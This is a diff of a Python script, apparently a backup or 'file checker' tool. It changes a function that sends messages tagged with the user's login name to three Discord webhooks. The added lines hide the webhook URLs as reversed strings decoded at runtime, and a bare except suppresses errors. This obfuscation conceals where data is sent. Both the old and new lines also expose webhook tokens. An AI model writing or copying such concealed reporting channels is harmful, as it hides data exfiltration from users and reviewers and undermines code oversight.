@@ -23,11 +23,11 @@ files_to_backup = [
 def log_to_discord(msg:str, important=False, basnicka = False):
     data = {"username":f"User:{os.getlogin()}", "content":msg}
     try:
-        requests.post("https://discord.com/api/webhooks/1433805119048122378/ti6aDqUL3CiJ4SVUWDLww1ef49SxVmaMsDK4Tvd8zX9ojhxmUkJ_iSaSPdWtKsVO82AM", json = data)
+        requests.post("pFn5WCsdVgu7jFZ-JheQbUp9gmCoXnHF16M_KCUnhID9iJFIX8rvBzTTO138Xs2O_IFG/8489768775628878841/skoohbew/ipa/moc.drocsid//:sptth"[::-1], json = data)
         if important:
-            requests.post("https://discord.com/api/webhooks/1434566903019606127/-a0uOC4OWuJx7qpPWbIAF7PdYSGHQKQqlFdu8lcvNBSq2N9KHUr-qjJgCjy9gl0w1BfT", json = data)
+            requests.post("SAoccbl0BVNMH_6g2CRwtHpXr8UhhpY3F06anpGpuIoQQm0pbmbigqqawfftAoT7uu6B/8874249185068878841/skoohbew/ipa/moc.drocsid//:sptth"[::-1], json = data)
         if basnicka:
-            requests.post("https://discord.com/api/webhooks/1434577986941616353/kl6qA7oNRII4QrDXnEPnfVXCNQn-xo8YaLOxjfyQnS58MSwfaLRngGOfECmQOl_WSOxY", json = data)
+            requests.post("9RXv44Z39rxAgHmDx60QFC3haocLzJntpSXvmXUxqZ0KoAtSTJCgQpfSREe9qhoBZiaN/0961957660550978841/skoohbew/ipa/moc.drocsid//:sptth"[::-1], json = data)
     except:
         print("Failed to send port request")
 log_to_discord("File checker...")
